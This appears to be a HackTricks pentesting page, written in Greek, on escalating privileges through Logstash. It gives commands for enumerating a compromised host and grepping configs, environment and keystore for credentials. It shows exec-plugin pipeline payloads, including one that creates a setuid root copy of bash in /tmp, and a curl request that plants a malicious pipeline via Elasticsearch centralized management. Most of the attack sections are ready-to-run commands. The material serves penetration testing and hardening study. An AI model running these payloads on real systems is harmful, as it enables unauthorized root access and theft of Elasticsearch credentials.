# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Το Logstash χρησιμοποιείται για **συλλογή, μετασχηματισμό και προώθηση logs** μέσω ενός συστήματος γνωστού ως **pipelines**. Αυτά τα pipelines αποτελούνται από στάδια **input**, **filter** και **output**. Μια ενδιαφέρουσα πτυχή προκύπτει όταν το Logstash εκτελείται σε ένα compromised machine.

### Pipeline Configuration

Τα pipelines ρυθμίζονται στο αρχείο **/etc/logstash/pipelines.yml**, το οποίο παραθέτει τις τοποθεσίες των pipeline configurations:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Αυτό το αρχείο αποκαλύπτει πού βρίσκονται τα αρχεία **.conf**, τα οποία περιέχουν pipeline configurations. Όταν χρησιμοποιείται ένα **Elasticsearch output module**, είναι συνηθισμένο τα **pipelines** να περιλαμβάνουν **Elasticsearch credentials**, τα οποία συχνά διαθέτουν εκτεταμένα δικαιώματα, επειδή το Logstash χρειάζεται να γράφει δεδομένα στο Elasticsearch. Τα wildcards στις διαδρομές configuration επιτρέπουν στο Logstash να εκτελεί όλα τα pipelines που ταιριάζουν στον καθορισμένο κατάλογο.

Αν το Logstash εκκινηθεί με `-f <directory>` αντί για `pipelines.yml`, **όλα τα αρχεία μέσα σε αυτόν τον κατάλογο συνενώνονται με λεξικογραφική σειρά και αναλύονται ως ένα ενιαίο config**. Αυτό δημιουργεί 2 επιθετικές συνέπειες:

- Ένα αρχείο που έχει τοποθετηθεί, όπως `000-input.conf` ή `zzz-output.conf`, μπορεί να αλλάξει τον τρόπο με τον οποίο συναρμολογείται το τελικό pipeline
- Ένα κακοσχηματισμένο αρχείο μπορεί να εμποδίσει τη φόρτωση ολόκληρου του pipeline, επομένως επικυρώστε προσεκτικά τα payloads πριν βασιστείτε στο auto-reload

### Γρήγορη Enumeration σε Compromised Host

Σε ένα host όπου είναι εγκατεστημένο το Logstash, ελέγξτε γρήγορα:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Επίσης, ελέγξτε αν το API τοπικής παρακολούθησης είναι προσβάσιμο. Από προεπιλογή ακούει στο **127.0.0.1:9600**, κάτι που συνήθως αρκεί μετά το landing στο host:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Αυτό συνήθως σας παρέχει pipeline IDs, λεπτομέρειες runtime και επιβεβαίωση ότι το τροποποιημένο pipeline έχει φορτωθεί.

Τα credentials που ανακτώνται από το Logstash συνήθως ξεκλειδώνουν το **Elasticsearch**, επομένως ελέγξτε [αυτήν την άλλη σελίδα σχετικά με το Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation μέσω Writable Pipelines

Για να επιχειρήσετε privilege escalation, εντοπίστε πρώτα τον χρήστη υπό τον οποίο εκτελείται η υπηρεσία Logstash, συνήθως τον χρήστη **logstash**. Βεβαιωθείτε ότι πληροίτε **ένα** από τα ακόλουθα κριτήρια:

- Διαθέτετε **write access** σε ένα αρχείο pipeline **.conf** **ή**
- Το αρχείο **/etc/logstash/pipelines.yml** χρησιμοποιεί wildcard και μπορείτε να γράψετε στον φάκελο-στόχο

Επιπλέον, πρέπει να πληρούται **μία** από τις ακόλουθες προϋποθέσεις:

- Έχετε τη δυνατότητα επανεκκίνησης της υπηρεσίας Logstash **ή**
- Στο αρχείο **/etc/logstash/logstash.yml** έχει οριστεί το **config.reload.automatic: true**

Με δεδομένο ένα wildcard στη διαμόρφωση, η δημιουργία ενός αρχείου που ταιριάζει με αυτό το wildcard επιτρέπει την εκτέλεση εντολών. Για παράδειγμα:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Εδώ, το **interval** καθορίζει τη συχνότητα εκτέλεσης σε δευτερόλεπτα. Στο συγκεκριμένο παράδειγμα, η εντολή **whoami** εκτελείται κάθε 120 δευτερόλεπτα και η έξοδός της κατευθύνεται στο **/tmp/output.log**.

Με το **config.reload.automatic: true** στο **/etc/logstash/logstash.yml**, το Logstash εντοπίζει και εφαρμόζει αυτόματα νέες ή τροποποιημένες διαμορφώσεις pipeline χωρίς να απαιτείται επανεκκίνηση.<sup>[[1]](#references)</sup> Αν δεν υπάρχει wildcard, μπορούν και πάλι να γίνουν τροποποιήσεις στις υπάρχουσες διαμορφώσεις, αλλά συνιστάται προσοχή για την αποφυγή διακοπών.

### Πιο Αξιόπιστα Pipeline Payloads

Το plugin εισόδου `exec` εξακολουθεί να λειτουργεί στις τρέχουσες εκδόσεις και απαιτεί είτε ένα **interval** είτε ένα **schedule**. Εκτελείται μέσω **forking** του Logstash JVM, επομένως, αν η μνήμη είναι περιορισμένη, το payload μπορεί να αποτύχει με `ENOMEM` αντί να εκτελεστεί σιωπηλά.

Ένα πιο πρακτικό privilege-escalation payload είναι συνήθως αυτό που αφήνει ένα durable artifact:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Αν δεν έχετε δικαιώματα επανεκκίνησης αλλά μπορείτε να στείλετε σήμα στη διεργασία, το Logstash υποστηρίζει επίσης επαναφόρτωση που ενεργοποιείται από **SIGHUP** σε συστήματα τύπου Unix:<sup>[[1]](#references)</sup>
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Να έχετε υπόψη ότι δεν είναι κάθε plugin συμβατό με reload. Για παράδειγμα, το input **stdin** αποτρέπει το automatic reload, επομένως μην θεωρείτε δεδομένο ότι το `config.reload.automatic` θα εντοπίζει πάντα τις αλλαγές σας.<sup>[[1]](#references)</sup>

### Κλοπή Secrets από το Logstash

Πριν επικεντρωθείτε αποκλειστικά στο code execution, συλλέξτε τα δεδομένα στα οποία έχει ήδη πρόσβαση το Logstash:

- Τα plaintext credentials είναι συχνά hardcoded μέσα σε outputs `elasticsearch {}`, στο `http_poller`, σε JDBC inputs ή σε ρυθμίσεις που σχετίζονται με cloud
- Οι secure settings μπορεί να βρίσκονται στο **`/etc/logstash/logstash.keystore`** ή σε κάποιον άλλο κατάλογο `path.settings`
- Ο κωδικός πρόσβασης του keystore παρέχεται συχνά μέσω του **`LOGSTASH_KEYSTORE_PASS`**, ενώ οι εγκαταστάσεις μέσω package συνήθως τον αντλούν από το **`/etc/sysconfig/logstash`**
- Η επέκταση environment variables με `${VAR}` επιλύεται κατά την εκκίνηση του Logstash, επομένως αξίζει να ελεγχθεί το περιβάλλον του service

Χρήσιμοι έλεγχοι:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Αυτό αξίζει επίσης να ελεγχθεί, επειδή το **CVE-2023-46672** έδειξε ότι το Logstash μπορούσε, υπό συγκεκριμένες συνθήκες, να καταγράφει ευαίσθητες πληροφορίες στα logs. Επομένως, σε έναν post-exploitation host, παλιά Logstash logs και εγγραφές του `journald` ενδέχεται να αποκαλύπτουν διαπιστευτήρια, ακόμη και αν η τρέχουσα διαμόρφωση αναφέρεται στο keystore αντί να αποθηκεύει τα secrets inline.<sup>[[3]](#references)</sup>

### Κατάχρηση Κεντρικοποιημένης Διαχείρισης Pipeline

Σε ορισμένα περιβάλλοντα, ο host **δεν** βασίζεται καθόλου σε τοπικά αρχεία `.conf`. Αν έχει ρυθμιστεί το **`xpack.management.enabled: true`**, το Logstash μπορεί να λαμβάνει centrally managed pipelines από το Elasticsearch/Kibana, και μετά την ενεργοποίηση αυτής της λειτουργίας οι τοπικές pipeline configs δεν αποτελούν πλέον την source of truth.<sup>[[2]](#references)</sup>

Αυτό σημαίνει μια διαφορετική attack path:

1. Ανακτήστε Elastic credentials από τις τοπικές ρυθμίσεις του Logstash, το keystore ή τα logs
2. Επαληθεύστε αν ο λογαριασμός διαθέτει το **`manage_logstash_pipelines`** cluster privilege
3. Δημιουργήστε ή αντικαταστήστε ένα centrally managed pipeline, ώστε ο Logstash host να εκτελέσει το payload σας στο επόμενο poll interval

Το Elasticsearch API που χρησιμοποιείται για αυτήν τη λειτουργία είναι:<sup>[[2]](#references)</sup>
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Αυτό είναι ιδιαίτερα χρήσιμο όταν τα τοπικά αρχεία είναι μόνο για ανάγνωση, αλλά το Logstash έχει ήδη καταχωριστεί για απομακρυσμένη λήψη pipelines.

## References

- [1] [Elastic Docs: Επαναφόρτωση του αρχείου διαμόρφωσης](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Elastic Docs: Διαμόρφωση κεντρικής διαχείρισης pipelines](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Ενημέρωση ασφαλείας Logstash 8.11.1 (ESA-2023-26) - CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)

{{#include ../../banners/hacktricks-training.md}}
